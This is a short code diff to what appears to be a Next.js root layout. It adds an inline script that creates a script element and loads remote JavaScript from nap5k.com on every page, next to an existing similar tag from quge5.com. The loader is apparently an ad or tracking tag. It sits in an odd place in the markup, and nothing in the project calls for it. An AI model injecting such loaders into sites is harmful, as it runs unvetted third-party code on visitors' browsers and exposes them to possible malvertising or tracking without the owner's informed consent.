@@ -125,6 +125,7 @@ export default function RootLayout({
           @media(max-width:640px){section{padding:3rem 0}}
         `}} />
       </head>
+      <script dangerouslySetInnerHTML={{ __html: "(function(s){s.dataset.zone='11011357',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))" }} />
       <script async src="https://quge5.com/88/tag.min.js" data-zone="239635" data-cfasync="false"></script>
       <body className="bg-white">
         <Analytics />
